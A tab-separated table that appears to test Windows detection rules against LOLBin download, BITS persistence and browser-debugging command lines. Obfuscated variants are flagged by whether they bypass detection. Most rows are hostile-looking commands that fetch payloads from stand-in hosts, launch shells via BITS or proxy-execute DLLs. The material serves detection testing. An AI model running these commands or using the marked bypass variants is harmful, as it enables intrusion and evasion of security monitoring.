Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d	bitsadmin.exe  /SetNotifyCmdLine myjob cmd.exe	bitsadmin.exe /SetNotifyCmdLine myjob cmd.exe	TRUE	FALSE	FALSE	Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		bitsadmin.exe /SetNotifyCmdLine myjob powershell.exe	TRUE	TRUE	TRUE	
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d	bitsadmin.exe  /AddFile myjob https://example.com/payload.exe C:\Temp\payload.exe	bitsadmin.exe /AddFile myjob https://example.com/payload.exe C:\Temp\payload.exe	TRUE	FALSE	FALSE	File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d	bitsadmin.exe  /AddFile myjob http://example.com/payload.exe C:\Temp\payload.exe	bitsadmin.exe /AddFile myjob http://example.com/payload.exe C:\Temp\payload.exe	TRUE	FALSE	FALSE	File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); File Download Via Bitsadmin (d059842b-6b9d-4ed1-b5c3-5b89143c6ede); Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d	bitsadmin.exe  /AddFile myjob ftp://example.com/payload.exe C:\Temp\payload.exe	bitsadmin.exe /AddFile myjob ftp://example.com/payload.exe C:\Temp\payload.exe	TRUE	FALSE	FALSE	File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d	bitsadmin.exe  /AddFile myjob ftps://example.com/payload.exe C:\Temp\payload.exe	bitsadmin.exe /AddFile myjob ftps://example.com/payload.exe C:\Temp\payload.exe	TRUE	FALSE	FALSE	File Download Via Bitsadmin To A Suspicious Target Folder (2ddef153-167b-4e89-86b6-757a9e65dcac); Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d	bitsadmin.exe  /SetNotifyCmdLine myjob C:\WINDOWS\system32\cmd.exe /c echo Test	bitsadmin.exe /SetNotifyCmdLine myjob %COMSPEC% /c echo Test	TRUE	FALSE	FALSE	Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d	bitsadmin.exe  /SetNotifyCmdLine myjob regsvr32.exe /s /n /u /i:evil.dll scrobj.dll	bitsadmin.exe /SetNotifyCmdLine myjob regsvr32.exe /s /n /u /i:evil.dll scrobj.dll	TRUE	FALSE	FALSE	Monitoring For Persistence Via BITS (b9cbbc17-d00d-4e3d-a827-b06d03d2380d)
t1197	proc_creation_win_bitsadmin_potential_persistence	Monitoring For Persistence Via BITS	b9cbbc17-d00d-4e3d-a827-b06d03d2380d		Start-BitsTransfer -Source http://example.com/payload.exe -Destination C:\Temp\payload.exe	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User_Data --headless	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless=new	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless --disable-gpu	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless --incognito	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_chromium_headless_debugging	Potential Data Stealing Via Chromium Headless Debugging	3e8207c5-fcd2-4ea6-9418-15d45b4890e4		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\Admin\AppData\Local\Google\Chrome\User\Data --headless --disable-automation	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe -remote-debugging-port=9222	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --user-data-dir=C:\Users\User\AppData\Local\Chrome\User\Data	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --profile-directory=Default	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-address=127.0.0.1 --remote-debugging-port=9222	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-socket-name=debug_socket	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-pipe=debug_pipe	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --no-sandbox	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --disable-gpu	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		chrome.exe --remote-debugging-port=9222 --headless=new	FALSE	FALSE	FALSE	
t1185	proc_creation_win_browsers_remote_debugging	Browser Started with Remote Debugging	b3d34dc5-2efd-4ae3-845f-8ec14921f449		firefox.exe -start-debugger-server 9222	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_chromium_headless_exec	Browser Execution In Headless Mode	ef9dcfed-690c-4c5d-a9d1-482cd422225c		copy msedge.exe not_a_browser.exe && not_a_browser.exe --headless	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_chromium_headless_exec	Browser Execution In Headless Mode	ef9dcfed-690c-4c5d-a9d1-482cd422225c		msedge.exe --headless=old	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_chromium_headless_exec	Browser Execution In Headless Mode	ef9dcfed-690c-4c5d-a9d1-482cd422225c		"set ""FLAG=--headless"" && msedge.exe %FLAG%"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_chromium_headless_file_download	File Download with Headless Browser	0e8cfe08-02c9-4815-a2f8-0d157b7ed33e		chromium.exe --headless --dump-dom http://example.com/payload.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_browsers_inline_file_download	File Download From Browser Process Via Inline URL	94771a71-ba41-4b6e-a757-b531372eaab6		msedge.exe http://example.com/payload.exe --window-size=800,600	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download	File Download via CertOC.EXE	70ad0861-d1fe-491c-a45f-fa48148a300d		"certoc.exe -GetCACAPS ""http://example.com/payload.dll"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download	File Download via CertOC.EXE	70ad0861-d1fe-491c-a45f-fa48148a300d		certoc.exe /GetCACAPS http://example.com/payload.dll	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download	File Download via CertOC.EXE	70ad0861-d1fe-491c-a45f-fa48148a300d		certoc.exe -GetCACAPS http://192.168.1.100/payload.ext	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download	File Download via CertOC.EXE	70ad0861-d1fe-491c-a45f-fa48148a300d		"cmd.exe /c ""certoc.exe -GetCACAPS h^t^t^p^:^/^/http://example.com/payload.dll"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download_direct_ip	File Download From IP Based URL Via CertOC.EXE	b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a		certoc.exe -GetCACAPS http://192.168.1.100/payload.ext	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download_direct_ip	File Download From IP Based URL Via CertOC.EXE	b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a		certoc.exe /GetCACAPS http://192.168.1.100/payload.ext	FALSE	FALSE	FALSE	
t1105	proc_creation_win_certoc_download_direct_ip	File Download From IP Based URL Via CertOC.EXE	b86f6dea-0b2f-41f5-bdcc-a057bd19cd6a		"certoc.exe -GetCACAPS ""http://192.168.1.100/payload.ext"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c t^y^p^e C:\temp\data.txt > \\webdav.server.local\share\data.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		"cmd.exe /c set ""cmd=type"" && call %cmd% \\webdav.server.local\share\file.txt > C:\temp\file.txt"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c type C:\temp\data.txt >\\webdav.server.local\share\data.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		cmd.exe /c t^yp^e payload.exe > payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_cmd_type_arbitrary_file_download	Potential Download/Upload Activity Using Type Command	aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f		"cmd.exe /c type ""payload.exe"" > payload.exe"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_curl_susp_download	Suspicious Curl.EXE Download	e218595b-bbe7-4ee5-8a96-f32a24ad3468	C:\Windows\System32\Curl.exe  -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\Public\Music\allthethingsx64.dll	C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\Public\Music\allthethingsx64.dll	TRUE	FALSE	FALSE	Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Insecure Transfer Via Curl.EXE (cb9cc1d1-e84e-4bdc-b7ad-c31b1b7908ec)
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe	TRUE	TRUE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe -lockscreenurl http://example.com/payload.exe	TRUE	TRUE	TRUE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\Temp\payload.exe	TRUE	TRUE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		"cmd.exe /c ""desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe"""	TRUE	TRUE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\Users\User\AppData\Local\Temp\payload.exe	TRUE	TRUE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /silent	TRUE	TRUE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:%temp%\payload.exe	TRUE	TRUE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\\Temp\\payload.exe	TRUE	TRUE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:/Temp/payload.exe	TRUE	TRUE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_susp_execution	Suspicious Desktopimgdownldr Command	bb58aa4a-b80b-415a-a2c0-2f65a4c81009	"cmd.exe /c ""desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr"""	desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr	TRUE	FALSE	FALSE	Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009); Suspicious Desktopimgdownldr Command (bb58aa4a-b80b-415a-a2c0-2f65a4c81009)
t1105	proc_creation_win_desktopimgdownldr_susp_execution	Suspicious Desktopimgdownldr Command	bb58aa4a-b80b-415a-a2c0-2f65a4c81009		desktopimgdownldr.exe -lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr	TRUE	TRUE	TRUE	
t1105	proc_creation_win_desktopimgdownldr_susp_execution	Suspicious Desktopimgdownldr Command	bb58aa4a-b80b-415a-a2c0-2f65a4c81009		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe?bypass=.jpg /eventName:desktopimgdownldr	TRUE	TRUE	TRUE	
t1105	proc_creation_win_gfxdownloadwrapper_arbitrary_file_download	Arbitrary File Download Via GfxDownloadWrapper.EXE	eee00933-a761-4cd0-be70-c42fe91731e7		GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gfxdownloadwrapper_arbitrary_file_download	Arbitrary File Download Via GfxDownloadWrapper.EXE	eee00933-a761-4cd0-be70-c42fe91731e7		"GfxDownloadWrapper.exe ""https://gameplayapi.intel.com/legitfile.exe"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gfxdownloadwrapper_arbitrary_file_download	Arbitrary File Download Via GfxDownloadWrapper.EXE	eee00933-a761-4cd0-be70-c42fe91731e7		GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe\	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gfxdownloadwrapper_arbitrary_file_download	Arbitrary File Download Via GfxDownloadWrapper.EXE	eee00933-a761-4cd0-be70-c42fe91731e7		GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe # comment	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		GUP.exe -unzipTo C:\Temp h t t p : / / example.com/payload.zip	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		GUP.exe -unzipTo=C:\Temp https://example.com/payload.zip	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		"GUP.exe -unzipTo=C:\Temp ""h t t p : / / example.com/payload.zip"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		GUP.exe -unzipTo=C:\Temp $env:url	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		GUP.exe -unzipTo=C:\Temp http://example.com/payload.zip	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe https://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe http://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe -url https://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe \\?\C:\\IEExec.exe https://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe https://example.com/payload.exe > NUL	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab\	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab -v	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab /v	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_extrac32	Suspicious Extrac32 Execution	aa8e035d-7be4-48d3-a944-102aec04400d		extrac32.exe /C \\127.0.0.1\share\archive.zip C:\path\to\extract\file.txt	TRUE	TRUE	TRUE	
